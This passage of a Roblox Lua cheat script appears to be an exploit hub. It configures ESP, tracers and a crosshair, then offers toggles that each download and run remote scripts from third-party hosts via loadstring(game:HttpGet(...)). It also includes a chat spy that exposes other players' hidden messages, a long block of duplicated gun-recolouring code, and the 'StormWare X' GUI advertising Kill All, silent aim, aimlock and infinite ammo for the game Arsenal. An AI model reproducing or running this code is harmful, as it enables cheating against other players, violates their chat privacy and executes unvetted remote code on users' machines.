    Text = "Size",
    Current = esp.size,
}, {1, 100, 1}, function(new)
    esp.size = new
end)

Esp:AddToggle({
    Text = "Center Text",
    State = esp.centertext
}, function(new)
    esp.centertext = new
end)

Esp:AddToggle({
    Text = "Outline",
    State = esp.outline,
}, function(new)
    esp.outline = new
end)

Esp:AddSlider({
    Text = "Draw Distance",
    Current = esp.drawdistance
}, {100,100000,100}, function(new)
    esp.drawdistance = new
end)


--
local Tracers = Visuals:AddToggleCategory({
    Text = "Tracers",
    State = tracers.enabled,
}, function(new)
    tracers.enabled = new
end)

Tracers:AddToggle({
    Text = "Show Team",
    State = tracers.showteam
}, function(new)
    tracers.showteam = new
end)

Tracers:AddToggle({
    Text = "Visible check",
    State = tracers.showvisible,
}, function(new)
    tracers.showvisible = new
end)

Tracers:AddToggle({
    Text = "From Mouse",
    State = tracers.frommouse,
}, function(new)
    tracers.frommouse = new
end)

Tracers:AddSlider({
    Text = "Draw Distance",
    Current = tracers.drawdistance,
}, {100,100000,100}, function(new)
    tracers.drawdistance = new
end)


local Crosshair = Visuals:AddToggleCategory({
    Text = "Crosshair",
    State = crosshair.enabled,
}, function(new)
    crosshair.enabled = new
end)

Crosshair:AddSlider({
    Text = "Transparency",
    Current = crosshair.transparency
}, {0,1,0.01}, function(new)
    crosshair.transparency = new
end)

Crosshair:AddSlider({
    Text = "Size",
    Current = crosshair.size,
}, {1,2000,1}, function(new)
    crosshair.size = new
end)

Crosshair:AddSlider({
    Text = "Thickness",
    Current = crosshair.thickness
}, {1,50,1}, function(new)
    crosshair.thickness = new
end)


local Hud = hud:AddTab({
    Text = "Hud",
})

hud.Keybind = settings:Get("hud.keybind", "RightAlt").Value
Hud:AddKeybind({
    Text = "Toggle",
    Current = hud.Keybind,
}, function(new)
    settings:Set("hud.keybind", new.Name)
    hud.Keybind = new.Name
end)

Hud:AddButton({
    Text = "Exit"
}, function()
    ah8:close()
end)

warn("AH8_MAIN : Reached end of script")
end
if TrigBot == true then
getgenv().FFAMode = FreeForAllTriggerBot;
getgenv().ReactionTime = 0;
getgenv().ToggleBind = {Enum.KeyCode.LeftAlt};
--[[
FFAMode is false by default, enable this in Free-for-All only games
LeftAlt to toggle by default
You can replace the ToggleBind keybind with any from this list:
https://developer.roblox.com/en-us/api-reference/enum/KeyCode
]]
loadstring(game:HttpGet("https://jacobies.xyz/triggerbot.lua"))()
end
if Cspy == true then
--This script reveals ALL hidden messages in the default chat
--chat "/e spy" to toggle!
enabled = true
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = false
--if true will use /me to stand out
publicItalics = false
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,6)=="/e spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{HACKERMODE "..(enabled and "" or "DE").."ACTIVATED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and p.Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{HACKERMODE} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{HACKERMODE} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end



for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{HACKERMODE "..(enabled and "" or "DE").."ACTIVATED}"
player:WaitForChild("PlayerGui"):WaitForChild("Chat")
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
wait(3)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end
if Aimhook == true then
   loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/hook.lua"))() 
end
if AutoClicker == true then
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
end
if InfiniteYield == true then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
if BTRoblox == true then
    loadstring(game:HttpGet("https://eternityhub.xyz/BetterRoblox/Loader"))()
end
if ModernizedGuns == true then
    local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Handle' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == '2Handle' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Mag' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Magzzine' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Supressor' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Grips' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Slide' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Slide Release' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'TeamColor' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Supressor Back' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'ForeGrip' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Stock_01' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Stock_02' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Wood' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Mag_02' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Mag_03' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Handle3' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Guitar' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'EoTech Body' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
local c = 1 function zigzag(X)  
return math.acos(math.cos(X * math.pi)) / math.pi 
end 
game:GetService("RunService").RenderStepped:Connect(function()  
if game.Workspace.Camera:FindFirstChild('Arms') then   
for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    
if v.Name == 'Handguard' then     
v.Color = Color3.fromRGB(0, 0, 0)
end   
end  
end 
end)
end
if NoScopeArcadeScript == true then
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/NOSCOPEARCADE", true))();
end
if OwlHub == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end
if FontChanger == true then
    local descendants = game:GetDescendants()

-- Loop through all of the descendants of the Workspace. If a
-- BasePart is found, the code changes that parts color to green
for _, descendant in pairs(descendants) do
	if descendant:IsA("TextLabel") then
		descendant.Font = Enum.Font.FontCFont
	end
end
end
if StormWare == true then
    local StormWareX = Instance.new("ScreenGui")
local ware = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local HomeFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local notes = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local CombatFrame = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local killall = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Free = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local used = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local Smoothlock = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local aimlock = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local lowertorso = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local random = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local triggerbot = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Hitboxes = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local mods = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local InfAmmo = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local FireRate = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local noRecoil = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local nospread = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local PlayerFrame = Instance.new("Frame")
local UICorner_18 = Instance.new("UICorner")
local TextLabel_8 = Instance.new("TextLabel")
local DSpoofs = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local console = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local mobile = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local pc = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local none = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local Others = Instance.new("Frame")
local UICorner_24 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local Gravity = Instance.new("TextBox")
local UICorner_25 = Instance.new("UICorner")
local upd = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local Nonexisty = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Sunglasses = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local Walkspeed = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local tpfly = Instance.new("Frame")
local UICorner_30 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local tel = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local teleport = Instance.new("TextBox")
local UICorner_33 = Instance.new("UICorner")
local VisualFrame = Instance.new("Frame")
local UICorner_34 = Instance.new("UICorner")
local TextLabel_12 = Instance.new("TextLabel")
local viss = Instance.new("Frame")
local UICorner_35 = Instance.new("UICorner")
local TextLabel_13 = Instance.new("TextLabel")
local updFov = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")
local fov = Instance.new("TextBox")
local UICorner_37 = Instance.new("UICorner")
local box = Instance.new("TextButton")
local UICorner_38 = Instance.new("UICorner")
local CreditsFrame = Instance.new("Frame")
local UICorner_39 = Instance.new("UICorner")
local Title_2 = Instance.new("TextLabel")
local upperText = Instance.new("TextLabel")
local stormcr = Instance.new("TextLabel")
local lolcat_relative = Instance.new("TextLabel")
local SIDE = Instance.new("Frame")
local UICorner_40 = Instance.new("UICorner")
local Visuals = Instance.new("TextButton")
local Player = Instance.new("TextButton")
local Home = Instance.new("TextButton")
local Credits = Instance.new("TextButton")
local Combat = Instance.new("TextButton")
local SEPERATOR = Instance.new("TextLabel")
local PFP = Instance.new("ImageButton")
local UICorner_41 = Instance.new("UICorner")
local currName = Instance.new("TextLabel")
local rnk = Instance.new("TextLabel")

--Properties:

StormWareX.Name = "StormWare X"
StormWareX.Parent = game:WaitForChild("CoreGui")
StormWareX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
StormWareX.DisplayOrder = 999
StormWareX.IgnoreGuiInset = true

ware.Name = "ware"
ware.Parent = StormWareX
ware.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ware.Position = UDim2.new(0, 0, -2.98023224e-08, 0)
ware.Size = UDim2.new(1, 0, 1, 0)

Title.Name = "Title"
Title.Parent = ware
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.416456461, 0, 0.00246913591, 0)
Title.Size = UDim2.new(0, 275, 0, 74)
Title.Font = Enum.Font.Sarpanch
Title.Text = "StormWare X"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 34.000
Title.TextWrapped = true

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = ware
HomeFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
HomeFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
HomeFrame.Size = UDim2.new(0, 1040, 0, 601)

UICorner.CornerRadius = UDim.new(0, 34)
UICorner.Parent = HomeFrame

TextLabel.Parent = HomeFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.234151155, 0, 0.0146322642, 0)
TextLabel.Size = UDim2.new(0, 552, 0, 50)
TextLabel.Font = Enum.Font.Nunito
TextLabel.Text = "The Best Competitive Arsenal Exploit."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

notes.Name = "notes"
notes.Parent = HomeFrame
notes.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
notes.Position = UDim2.new(0.0192307699, 0, 0.164725453, 0)
notes.Size = UDim2.new(0, 1000, 0, 442)

UICorner_2.Parent = notes

TextLabel_2.Parent = notes
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.200226963, 0, -0.00202696794, 0)
TextLabel_2.Size = UDim2.new(0, 568, 0, 50)
TextLabel_2.Font = Enum.Font.Nunito
TextLabel_2.Text = "Update V2.0.0"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = notes
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0179297999, 0, 0.289828271, 0)
TextLabel_3.Size = UDim2.new(0, 272, 0, 50)
TextLabel_3.Font = Enum.Font.Nunito
TextLabel_3.Text = "[+] Stormware Revamped V2"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

TextLabel_4.Parent = notes
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.0179297999, 0, 0.398425549, 0)
TextLabel_4.Size = UDim2.new(0, 272, 0, 50)
TextLabel_4.Font = Enum.Font.Nunito
TextLabel_4.Text = "[+] RightShift to toggle the gui"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

CombatFrame.Name = "CombatFrame"
CombatFrame.Parent = ware
CombatFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CombatFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
CombatFrame.Size = UDim2.new(0, 1040, 0, 601)
CombatFrame.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 34)
UICorner_3.Parent = CombatFrame

TextLabel_5.Parent = CombatFrame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.296220154, 0, 0.014632266, 0)
TextLabel_5.Size = UDim2.new(0, 421, 0, 50)
TextLabel_5.Font = Enum.Font.Nunito
TextLabel_5.Text = "Combat"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

killall.Name = "killall"
killall.Parent = CombatFrame
killall.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
killall.Position = UDim2.new(0.0452586412, 0, 0.682403445, 0)
killall.Size = UDim2.new(0, 84, 0, 40)
killall.Font = Enum.Font.Nunito
killall.Text = "Kill All (use knife) (synapse)"
killall.TextColor3 = Color3.fromRGB(255, 255, 255)
killall.TextScaled = true
killall.TextSize = 14.000
killall.TextWrapped = true

UICorner_4.Parent = killall

Free.Name = "Free"
Free.Parent = CombatFrame
Free.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Free.Position = UDim2.new(0.269396573, 0, 0.682403445, 0)
Free.Size = UDim2.new(0, 84, 0, 40)
Free.Font = Enum.Font.Nunito
Free.Text = "Kill All (Use knife)"
Free.TextColor3 = Color3.fromRGB(255, 255, 255)
Free.TextScaled = true
Free.TextSize = 14.000
Free.TextWrapped = true

UICorner_5.Parent = Free

used.Name = "used"
used.Parent = CombatFrame
used.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
used.Position = UDim2.new(0.0192307681, 0, 0.153078258, 0)
used.Size = UDim2.new(0, 392, 0, 208)

UICorner_6.Parent = used

TextLabel_6.Parent = used
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.298829675, 0, -0.00457220571, 0)
TextLabel_6.Size = UDim2.new(0, 177, 0, 50)
TextLabel_6.Font = Enum.Font.Nunito
TextLabel_6.Text = "Most used"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

Smoothlock.Name = "Smoothlock"
Smoothlock.Parent = used
Smoothlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Smoothlock.Position = UDim2.new(0.534790635, 0, 0.476394892, 0)
Smoothlock.Size = UDim2.new(0, 84, 0, 40)
Smoothlock.Font = Enum.Font.Nunito
Smoothlock.Text = "Smoothlock (press c to toggle)"
Smoothlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Smoothlock.TextScaled = true
Smoothlock.TextSize = 14.000
Smoothlock.TextWrapped = true

UICorner_7.Parent = Smoothlock

aimlock.Name = "aimlock"
aimlock.Parent = used
aimlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
aimlock.Position = UDim2.new(0.0452586263, 0, 0.257510722, 0)
aimlock.Size = UDim2.new(0, 84, 0, 40)
aimlock.Font = Enum.Font.Nunito
aimlock.Text = "Aimlock"
aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
aimlock.TextScaled = true
aimlock.TextSize = 14.000
aimlock.TextWrapped = true

UICorner_8.Parent = aimlock

lowertorso.Name = "lowertorso"
lowertorso.Parent = used
lowertorso.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
lowertorso.Position = UDim2.new(0.0449067503, 0, 0.476394862, 0)
lowertorso.Size = UDim2.new(0, 84, 0, 40)
lowertorso.Font = Enum.Font.Nunito
lowertorso.Text = "Silent Aim (torso)"
lowertorso.TextColor3 = Color3.fromRGB(255, 255, 255)
lowertorso.TextScaled = true
lowertorso.TextSize = 14.000
lowertorso.TextWrapped = true

UICorner_9.Parent = lowertorso

random.Name = "random"
random.Parent = used
random.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
random.Position = UDim2.new(0.29732582, 0, 0.476394862, 0)
random.Size = UDim2.new(0, 84, 0, 40)
random.Font = Enum.Font.Nunito
random.Text = "Silent Aim (Random)"
random.TextColor3 = Color3.fromRGB(255, 255, 255)
random.TextScaled = true
random.TextSize = 14.000
random.TextWrapped = true

UICorner_10.Parent = random

triggerbot.Name = "triggerbot"
triggerbot.Parent = used
triggerbot.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
triggerbot.Position = UDim2.new(0.509280443, 0, 0.267126113, 0)
triggerbot.Size = UDim2.new(0, 84, 0, 40)
triggerbot.Font = Enum.Font.Nunito
triggerbot.Text = "Triggerbot"
triggerbot.TextColor3 = Color3.fromRGB(255, 255, 255)
triggerbot.TextScaled = true
triggerbot.TextSize = 14.000
triggerbot.TextWrapped = true

UICorner_11.Parent = triggerbot

Hitboxes.Name = "Hitboxes"
Hitboxes.Parent = used
Hitboxes.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Hitboxes.Position = UDim2.new(0.269396544, 0, 0.257510722, 0)
Hitboxes.Size = UDim2.new(0, 84, 0, 40)
Hitboxes.Font = Enum.Font.Nunito
Hitboxes.Text = "Silent Aim (Head)"
Hitboxes.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitboxes.TextScaled = true
Hitboxes.TextSize = 14.000
Hitboxes.TextWrapped = true

UICorner_12.Parent = Hitboxes

mods.Name = "mods"
mods.Parent = CombatFrame
mods.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
mods.Position = UDim2.new(0.450000018, 0, 0.153078258, 0)
mods.Size = UDim2.new(0, 392, 0, 208)

UICorner_13.Parent = mods

TextLabel_7.Parent = mods
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.209543958, 0, -0.00457220804, 0)
TextLabel_7.Size = UDim2.new(0, 226, 0, 50)
TextLabel_7.Font = Enum.Font.Nunito
TextLabel_7.Text = "Gun Modifications"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

InfAmmo.Name = "InfAmmo"
InfAmmo.Parent = mods
